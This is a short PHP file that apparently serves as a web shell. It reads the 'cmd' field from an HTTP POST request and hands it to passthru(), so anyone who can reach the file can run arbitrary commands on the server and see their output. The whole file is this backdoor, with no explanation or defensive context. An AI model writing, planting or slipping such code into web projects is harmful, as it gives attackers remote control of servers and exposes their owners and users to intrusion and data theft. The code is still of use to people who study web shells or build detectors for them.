<?php
function execute($com)
{
    passthru($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>